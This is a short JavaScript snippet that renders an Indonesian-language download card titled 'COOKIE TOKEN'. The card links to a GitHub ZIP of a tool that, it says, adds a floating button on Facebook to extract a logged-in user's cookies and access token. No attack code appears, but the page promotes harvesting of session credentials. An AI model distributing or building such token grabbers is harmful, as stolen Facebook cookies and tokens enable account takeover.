const target = document.getElementById('status-container');

if (target) {
    target.innerHTML = `
    <style>
        #status-container {
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; font-family: sans-serif; padding:10px;
        }
        .card { 
            background: white; padding: 24px; border-radius: 12px; 
            box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 320px; 
        }
        .icon { font-size: 50px; margin-bottom: 10px; }
        .card h1 { color: #1c1e21; font-size: 18px; margin: 0 0 10px 0; font-weight: 800; }
        .btn { 
            background-color: #0866ff; color: white !important; padding: 12px; 
            text-decoration: none; border-radius: 8px; font-weight: bold; 
            display: block; font-size: 14px; margin: 20px 0;
        }
        .instruction { font-size: 11px; color: #65676b; text-align: left; border-top: 1px solid #ddd; padding-top: 10px; }
    </style>

    <div class="card">
        <div class="icon">💾️</div>
        <h1>COOKIE TOKEN</h1>
        <p style=":color#555;font-size:15px;">Gunakan link di bawah untuk mengunduh pastikan sudah login fb mode desktop</p>
        
        <a href="https://github.com/tommydev27/cookie-token/archive/refs/heads/main.zip" class="btn">
            Download ZIP Sekarang
        </a>

        <div class="instruction">
            <b>Info:</b> Fitur ambil data (Cookie/Token) ada di tombol melayang saat kamu buka Facebook.
        </div>
        <p>
        <footer style="color#555;font-size:10px;">Developed by
<b style="color: #2c63fb;">TommyWeb</b>
© 2026
    </div>
    `;
}
